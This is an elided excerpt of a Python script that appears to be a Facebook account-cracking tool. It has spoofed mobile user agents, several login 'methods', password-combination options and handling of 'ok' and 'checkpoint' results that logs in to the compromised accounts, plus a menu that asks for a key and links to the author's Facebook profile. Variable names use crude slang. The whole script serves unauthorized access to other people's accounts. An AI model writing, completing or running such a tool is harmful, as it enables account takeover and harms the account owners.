...
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "Jun", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
...
##############################
 # USER AGENT #
ugen=('Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36')
ugen2=['Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36']
...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        ...
        if cek_cp =="":
            ...
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}python123{N}")
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}═══════════════════════════════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[PYTHON-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[PYTHON-CP] ", ""), titid[1])
...
class __chigoue__:
    ...
    def chi(self, id):
        os.system("clear")
        logo()
        crot = input(f" {H}[{H}+{H}] Want to show related apps [{H}Y{H}/{H}N{H}]: ")
        if crot in[""]:
...
# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[ PYTHON ]","\x1b[1;92m[ PYTHON ]","\x1b[1;92m[ PYTHON ]","\x1b[1;92m[ PYTHON ]","\x1b[1;92m[ PYTHON ]","\x1b[1;92m[ PYTHON ]","\x1b[1;92m[ PYTHON ]"])
    ...
    def __pler__(self):
        ...
        print ('[1] Method 1 ( free )')
        print ('[2] Method 2 ( mbasic )')
        print ('[3] Method 3 ( mobile )')
    ...
    def kombinasi_pw(self,url):
        ...
        print('%s[%s1%s] Password 1 ( Best )'%(H,H,H))
...
def alok():
    try:
        ...
        os.system("clear")
        logo()
        print(' [%s!%s] 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗔𝗗𝗠𝗜𝗡 𝗜𝗙 𝗔𝗡𝗬𝗢𝗡𝗘 𝗜𝗦 𝗕𝗨𝗬𝗜𝗡𝗚 𝗔𝗡𝗗 𝗦𝗘𝗟𝗟𝗜𝗡𝗚 𝗦𝗖 𝗠𝗘𝗧𝗔. 𝗧𝗛𝗜𝗦 𝗦𝗖 %s𝗙𝗥𝗘𝗘%s'%(M,N,H,N))
        print('\n %s%s𝗠𝗲𝗻𝘂 𝗧𝗼𝗼𝗹𝘀%s'%(BM,P,N))
        print(' [%s1%s] Login Key'%(H,N))
        print(' [%s2%s] Contact Admin'%(H,N))
        pil = input('\n %s[%s?%s] Choice : '%(N,K,N))
        if pil =="":
            jalan(f" {N}[{M}×{N}] Sorry, it is wrong...!");time.sleep(1);alok()
        elif pil in["2","02"]:
            jalan("\n %s[%s•%s] %s𝗬𝗼𝘂 𝗪𝗶𝗹𝗹 𝗕𝗲 𝗥𝗲𝗱𝗶𝗿𝗲𝗰𝘁𝗼𝗿 𝗧𝗼 𝗧𝗵𝗲 𝗔𝘂𝘁𝗵𝗼𝗿 𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸..."%(N,H,N,H));time.sleep(0.02)
            os.system('xdg-open https://www.facebook.com/ricamae.naranja.1');time.sleep(2);alok()
        elif pil in["1","01"]:
            print('%s═══════════════════════════════════════════════════════════════════'%(N))
